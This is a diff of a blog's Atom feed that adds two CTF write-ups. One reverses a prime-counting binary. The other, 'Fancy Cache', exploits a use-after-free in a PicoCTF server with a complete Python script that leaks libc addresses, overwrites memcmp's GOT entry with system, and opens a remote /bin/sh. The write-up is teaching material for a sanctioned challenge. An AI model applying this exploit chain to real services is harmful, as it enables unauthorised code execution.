@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Reversing | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/reversing/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-11T19:45:20+01:00</updated>
+  <updated>2014-12-24T12:12:27+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,63 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
+    <updated>2014-12-24T11:38:35+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
+    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>
+
+<!-- more -->
+
+
+<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>
+
+<pre><code>   0x400703:    movsxd rax,DWORD PTR [rsp+0x8]
+=&gt; 0x400708:    cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
+   0x40070f:    je     0x400780
+   0x400711:    add    DWORD PTR [rsp+0xc],0x1
+</code></pre>
+
+<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>
+
+<pre><code>  400780:   8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
+  400784:   be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
+  400789:   bf 01 00 00 00          mov    edi,0x1
+  40078e:   31 c0                   xor    eax,eax
+  400790:   e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;
+</code></pre>
+
+<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>
+
+<pre><code>  4008e0:   49 89 ce                mov    r14,rcx
+  4008e3:   48 89 fa                mov    rdx,rdi
+  4008e6:   4c 89 d7                mov    rdi,r10
+  4008e9:   4c 89 ce                mov    rsi,r9
+  4008ec:   48 31 c0                xor    rax,rax
+  4008ef:   b0 23                   mov    al,0x23  ; nanosleep
+  4008f1:   0f 05                   syscall 
+</code></pre>
+
+<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>
+
+<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>
+
+<pre><code>rsp+0x8     rsp+0xc
+-------------------
+    1           1
+    2           2
+    3           5
+    4           7
+    5           11
+</code></pre>
+
+<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>
+
+<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[9447 CTF: Rolling]]></title>
@@ -169,6 +226,332 @@ RAX: 0x72 ('r')
 <p>This meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each <code>cmp</code> execution, I noted the proper byte and the correct input turned out to be <code>9447rollingisfun</code>.</p>
 
 <p>The flag was <code>9447{9447rollingisfun}</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PicoCTF - Fancy Cache]]></title>
+    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache/"/>
+    <updated>2014-11-06T23:49:03+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache</id>
+    <content type="html"><![CDATA[<p>Fancy Cache was another &ldquo;Master Challenge&rdquo; for PicoCTF. It featured a custom server, which allegedly creates a cache of strings. It&rsquo;s up to us to break it!</p>
+
+<!--more-->
+
+
+<p>We are given the source code, the binary, a libc library and a client written in Python. Wow! <code>fancy_cache</code> communicates in a difficult way, but luckily, all the heavy lifting is already done for us in <code>client.py</code>! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:</p>
+
+<pre><code class="c">struct cache_entry *cache_lookup(struct string *key) {
+  size_t i;
+  for (i = 0; i &lt; kCacheSize; ++i) {
+    struct cache_entry *entry = &amp;cache[i];
+
+    // Skip expired cache entries.
+    if (entry-&gt;lifetime == 0) {
+      continue;
+    }
+
+    if (string_eq(entry-&gt;key, key)) {
+       return entry;
+    }
+  }
+
+  return NULL;
+}
+
+void do_cache_get(void) {
+  struct string key;
+  string_init(&amp;key);
+  read_into_string(&amp;key);
+
+  struct cache_entry *entry = cache_lookup(&amp;key);
+  if (entry == NULL) {
+    write(STDOUT_FILENO, &amp;kNotFound, sizeof(kNotFound));
+    return;
+  }
+
+  write(STDOUT_FILENO, &amp;kFound, sizeof(kFound));
+  write_string(entry-&gt;value);
+
+  --entry-&gt;lifetime;
+  if (entry-&gt;lifetime &lt;= 0) {
+    // The cache entry is now expired.
+    fprintf(stderr, "Destroying key %s\n", entry-&gt;key-&gt;data);
+    string_destroy(entry-&gt;key);
+    fprintf(stderr, "Destroying value %s\n", entry-&gt;value-&gt;data);
+    string_destroy(entry-&gt;value);
+  }
+}
+</code></pre>
+
+<p>The function <code>do_cache_get</code> will free a string struct when the lifetime goes below zero, but <code>cache_lookup</code> will happily return entries with a negative lifetime. That means we can free a string struct, <em>somehow</em> write to it, and influence the cache entries! After calls to <code>free()</code>, subsequent calls to <code>malloc()</code> will usually return recently freed memory. For instance, consider this sequence:</p>
+
+<pre><code class="bash"># start our server
+bas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
+</code></pre>
+
+<p>And modify the client.py script a bit:</p>
+
+<pre><code class="python"># Add an entry with a negative lifetime. This will fool cache_lookup.
+cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
+
+# Request that value, causing it to be deleted from cache
+print cache_get(f, 'keyAAAA')
+
+# Now request the value of 'bleh'
+print cache_get(f, 'bleh')
+</code></pre>
+
+<p>This results in the following debug output of the local server:</p>
+
+<pre><code class="bash">malloc(12) = 0x8598008 (string_create)
+realloc((nil), 7) = 0x8598018 (read_into_string)
+malloc(12) = 0x8598028 (string_create)
+realloc((nil), 8) = 0x8598038 (read_into_string)
+realloc((nil), 7) = 0x8598048 (read_into_string)
+Destroying key
+free(0x8598008) (string_destroy str)
+Destroying value
+free(0x8598028) (string_destroy str)
+realloc((nil), 4) = 0x8598028 (read_into_string)
+</code></pre>
+
+<p>At first, the code allocates <code>0x8598008</code> and <code>0x8598028</code> as <code>key</code> and <code>value</code> string structs, respectively. Then, we request the value of &lsquo;keyAAAA&rsquo;, causing do_cache_get to free that memory again. Next, we request the value of the non-existent key &lsquo;bleh&rsquo;. However, the program allocates space at <code>0x8598028</code>, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let&rsquo;s first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says <code>REDACTED</code>. In order for this work, cache->key->data must point to a real string. I choose &lsquo;printf&rsquo; in the binary. So:</p>
+
+<ul>
+<li>We register a struct string with lifetime -1.</li>
+<li>We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0</li>
+<li>We try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key &amp; value regions (still valid according to cache_lookup()!).</li>
+<li>We “write” a string struct into value:
+<code>bash
+old_value-&gt;length = 0xff
+old_value-&gt;capacity = 0x00
+old_value-&gt;data = pointer to whatever we want to read
+</code></li>
+<li>We write a string struct into key:</li>
+</ul>
+
+
+<pre><code class="bash">old_key-&gt;length = 0x6
+old_key-&gt;cap = 0x00
+old_key-&gt;data = pointer to string that is known, like printf -&gt;      0x8048310
+</code></pre>
+
+<p>We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:</p>
+
+<pre><code class="c">    if (string_eq(entry-&gt;key, key)) {
+       return entry;
+    }
+</code></pre>
+
+<ul>
+<li>We request the key called &lsquo;printf&rsquo;; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!</li>
+</ul>
+
+
+<pre><code class="python">### modifications to client.py:
+
+# Add an entry to the cache
+assert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
+# Delete from cache
+print cache_get(f, 'keyAAAA')
+# This is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)). 
+print cache_get(f, '\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08')
+# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
+# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
+print cache_get(f, '\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08')
+# Print the actual data!
+print cache_get(f, 'printf')
+</code></pre>
+
+<p>This gives the following output locally:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
+AAAA____
+None
+None
+REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED
+</code></pre>
+
+<p>And for the remote server:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
+
+AAAA____
+None
+None
+ongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel
+</code></pre>
+
+<p>Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of <code>memcmp</code>, which we need to defeat ASLR. Using the same read memory trick, we grab the address of <code>memcmp</code>, which is stored at <code>0x804b014</code>. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to <code>0x804b014</code> by doing a cache_set call. Finally, we need to trigger <code>memcmp</code>, which now actually calls <code>system</code>. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what&rsquo;s going on):</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct
+import socket
+import telnetlib
+
+def pack4(v):
+    """
+    Takes a 32 bit integer and returns a 4 byte string representing the
+    number in little endian.
+    """
+    assert 0 &lt;= v &lt;= 0xffffffff
+    # The &lt; is for little endian, the I is for a 4 byte unsigned int.
+    # See https://docs.python.org/2/library/struct.html for more info.
+    return struct.pack('&lt;I', v)
+
+def unpack4(v):
+    """Does the opposite of pack4."""
+    assert len(v) == 4
+    return struct.unpack('&lt;I', v)[0]
+
+CACHE_GET = 0
+CACHE_SET = 1
+
+kNotFound = 0x0
+kFound = 0x1
+kCacheFull = 0x2
+
+def write_string(f, s):
+    f.write(pack4(len(s)))
+    f.write(s)
+
+def read_string(f):
+    size = unpack4(f.read(4))
+    return f.read(size)
+
+def cache_get(f, key):
+    f.write(chr(CACHE_GET))
+    write_string(f, key)
+
+    status = ord(f.read(1))
+    if status == kNotFound:
+        return None
+    assert status == kFound
+
+    return read_string(f)
+
+# We need this modified function, because once we hit system('/bin/sh'),
+# there will be no more data sent back in the way that the original 
+# function expects. This causes it to b0rk.
+def cache_get2(f, key):
+    f.write(chr(CACHE_GET))
+    write_string(f, key)
+
+def cache_set(f, key, value, lifetime):
+    f.write(chr(CACHE_SET))
+    write_string(f, key)
+
+    status = ord(f.read(1))
+    if status == kCacheFull:
+        return False
+    assert status == kFound
+
+    write_string(f, value)
+    f.write(pack4(lifetime))
+    return True
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('vuln2014.picoctf.com', 4548))
+f = s.makefile('rw', bufsize=0)
+
+# Command to be executed later, once we've overwritten memcmp@plt.
+cmd = '/bin/sh\x00'
+
+# Add an entry to the cache; we will use this command later to spawn the shell. 
+cache_set(f, cmd, "payload", 1000)
+
+# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:
+'''
+    // Skip expired cache entries.
+    if (entry-&gt;lifetime == 0) {
+      continue;
+    }
+'''
+cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
+
+# Request that value, causing it to be deleted from cache
+print cache_get(f, 'keyAAAA')
+
+'''
+// This is how the string struct looks like:
+struct string {
+  size_t length;
+  size_t capacity;
+  char *data;
+};
+'''
+# Now, we request the value of a key called '\x04\x00\x00\x00\x00\x00\x00\..."
+# but this is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)),
+# because malloc will re-use this address.
+# Leak memcmp address @ 0x804b014
+cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))
+
+# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
+# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
+cache_get(f, pack4(6)+pack4(6)+pack4(0x8048310))
+
+# Grab memcmp address:
+addr_memcmp = unpack4(cache_get(f, 'printf'))
+print "[+] Leaking memcmp address: {}".format(hex(addr_memcmp))
+
+# Calculate system address:
+addr_system = addr_memcmp - 0x142870 + 0x40100 
+print "[+] Calculated system address: {}".format(hex(addr_system))
+
+# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. 
+# We'd love to abuse our old cache entry again, but alas, the memory regions have again been 
+# freed(), due to cache_get seeing a lifetime &lt;= 0.
+# We'll restore them, so we can abuse them again to write to 0x804b014.
+
+cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))
+cache_get(f, pack4(6)+pack4(0)+pack4(0x8048310))
+
+print "[+] Attempting to overwrite memcmp pointer..."
+assert cache_set(f, 'printf', pack4(addr_system), 1)
+
+print "[+] Running {} on remote box".format(cmd)
+print cache_get2(f, cmd)
+
+# Once you get the service to run a shell, this lets you send commands
+# to the shell and get the results back :-)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>Running it lands us a shell!</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
+AAAA____
+[+] Leaking memcmp address: 0xf7686870
+[+] Calculated system address: 0xf7584100
+[+] Attempting to overwrite memcmp pointer...
+[+] Running /bin/sh on remote box
+None
+id
+uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
+ls /home/ 
+bleichenbacher
+easyoverflow
+ecb
+fancy_cache
+guess
+hardcore_owner
+lowentropy
+netsino
+policerecords
+ubuntu
+ls /home/fancy_cache
+fancy_cache
+fancy_cache.sh
+flag.txt
+cat /home/fancy_cache/flag.txt
+that_wasnt_so_free_after_all
+</code></pre>
+
+<p>The flag is <code>that_wasnt_so_free_after_all</code>. Fancy indeed!</p>
 ]]></content>
   </entry>
   
